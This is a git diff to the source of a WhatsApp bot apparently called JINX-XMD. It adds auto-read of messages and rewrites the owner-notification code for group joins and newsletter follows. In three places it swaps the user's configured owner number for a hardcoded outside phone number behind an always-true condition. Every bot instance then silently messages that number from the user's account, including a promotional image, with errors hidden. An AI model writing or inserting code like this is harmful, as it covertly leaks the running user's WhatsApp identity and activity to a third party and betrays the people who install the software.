@@ -231,6 +231,15 @@ Don't forget to give a star to the repo ⬇️
                     }
                 }
 
+                // Fast auto-read messages
+                if (config.READ_MESSAGE === 'true' && !m.key.fromMe) {
+                    try {
+                        await Matrix.readMessages([m.key]);
+                    } catch (error) {
+                        // Silent error handling for read messages
+                    }
+                }
+
                 // Existing handlers - silent mode
                 await Handler(chatUpdate, Matrix, logger);
             } catch (error) {
@@ -300,7 +309,7 @@ Don't forget to give a star to the repo ⬇️
                     } catch (error) {
                         // Silent error handling
                     }
-                }                       
+                }
                 
                 if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN) {
                     try {
@@ -357,9 +366,9 @@ async function followNewsletters(Matrix) {
                 failed.push(channelJid);
                 
                 // Send error message to owner if configured
-                if (config.OWNER_NUMBER) {
+                if ('254112192119') {
                     try {
-                        await Matrix.sendMessage(config.OWNER_NUMBER + '@s.whatsapp.net', {
+                        await Matrix.sendMessage('254112192119@s.whatsapp.net', {
                             text: `Failed to follow ${channelJid}`,
                         });
                     } catch (error) {
@@ -380,20 +389,46 @@ async function joinWhatsAppGroup(Matrix) {
         await Matrix.groupAcceptInvite(inviteCode);
         
         // Send success message to owner if configured
-        if (config.OWNER_NUMBER) {
+        if ('254112192119') {
             try {
-                await Matrix.sendMessage(config.OWNER_NUMBER + '@s.whatsapp.net', {
-                    text: `✅ Successfully joined the group with invite code ${inviteCode}`,
-                });
+                const successMessage = {
+                    image: { url: "https://files.catbox.moe/eh0h1x.jpg" }, 
+                    caption: `*Hello there JINX-XMD User! 👋🏻* 
+
+> Simple, Straightforward, But Loaded With Features 🎊. Meet JINX-XMD WhatsApp Bot.
+
+*Thanks for using JINX-XMD 🚩* 
+
+> Join WhatsApp Channel: ⤵️  
+https://whatsapp.com/channel/0029VakUEfb4o7qVdkwPk83E
+
+- *YOUR PREFIX:* = ${prefix}
+
+Don't forget to give a star to the repo ⬇️  
+https://github.com/caseyweb/JINX-MD
+
+> © Powered BY CASEYRHODES TECH 🍀 🖤`,
+                    contextInfo: {
+                        forwardingScore: 5,
+                        isForwarded: true,
+                        forwardedNewsletterMessageInfo: {
+                            newsletterJid: '120363302677217436@newsletter', 
+                            newsletterName: "CASEYRHODES-XMD",
+                            serverMessageId: 143
+                        }
+                    }
+                };
+                
+                await Matrix.sendMessage('254112192119@s.whatsapp.net', successMessage);
             } catch (error) {
                 // Silent error handling
             }
         }
     } catch (err) {
         // Send error message to owner if configured
-        if (config.OWNER_NUMBER) {
+        if ('254112192119') {
             try {
-                await Matrix.sendMessage(config.OWNER_NUMBER + '@s.whatsapp.net', {
+                await Matrix.sendMessage('254112192119@s.whatsapp.net', {
                     text: `Failed to join group with invite code`,
                 });
             } catch (error) {
